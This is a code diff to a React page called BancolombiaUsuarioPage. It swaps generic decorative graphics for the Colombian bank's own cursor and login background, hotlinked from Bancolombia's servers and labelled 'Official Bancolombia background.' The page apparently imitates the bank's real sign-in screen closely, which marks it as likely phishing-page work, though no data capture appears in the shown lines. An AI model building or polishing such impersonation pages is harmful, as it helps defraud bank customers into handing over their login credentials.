@@ -51,22 +51,23 @@ export default function BancolombiaUsuarioPage() {
   };
 
   return (
-    <div className="min-h-screen bg-white flex items-center justify-center p-4 relative overflow-hidden">
-      {/* Decorative arcs */}
-      <div className="absolute top-0 left-0 w-full h-full pointer-events-none overflow-hidden">
-        <svg className="absolute -top-32 -left-32 w-96 h-96" viewBox="0 0 400 400" fill="none">
-          <path d="M-20 380 Q 150 200 320 380" stroke="#FF6B35" strokeWidth="40" fill="none" opacity="0.4"/>
-          <path d="M-10 390 Q 160 210 330 390" stroke="#FFA500" strokeWidth="40" fill="none" opacity="0.4"/>
-          <path d="M0 400 Q 170 220 340 400" stroke="#FFD700" strokeWidth="40" fill="none" opacity="0.4"/>
-        </svg>
-        <svg className="absolute -bottom-32 -right-32 w-96 h-96" viewBox="0 0 400 400" fill="none">
-          <path d="M420 20 Q 250 200 80 20" stroke="#9333EA" strokeWidth="40" fill="none" opacity="0.4"/>
-          <path d="M410 10 Q 240 190 70 10" stroke="#F59E0B" strokeWidth="40" fill="none" opacity="0.4"/>
-          <path d="M400 0 Q 230 180 60 0" stroke="#EF4444" strokeWidth="40" fill="none" opacity="0.4"/>
-        </svg>
-      </div>
+    <div 
+      className="min-h-screen bg-gray-50 relative"
+      style={{
+        fontFamily: '"Open Sans", Arial, sans-serif',
+        cursor: 'url("https://svpersonas.apps.bancolombia.com/assets/images/light-cursor-small.png"), auto'
+      }}
+    >
+      {/* Official Bancolombia background */}
+      <div 
+        className="min-h-screen bg-no-repeat bg-center flex items-center justify-center p-4"
+        style={{
+          backgroundImage: 'url("https://svpersonas.apps.bancolombia.com/assets/images/auth-trazo.svg")',
+          backgroundSize: '100%'
+        }}
+      >
 
-      <div className="max-w-lg w-full relative z-10">
+        <div className="max-w-lg w-full relative z-10">
         {/* Header */}
         <div className="text-center mb-8">
           <img 
@@ -152,6 +153,7 @@ export default function BancolombiaUsuarioPage() {
             alt="Bancolombia" 
             className="h-5 mx-auto opacity-60"
           />
+        </div>
         </div>
       </div>
     </div>
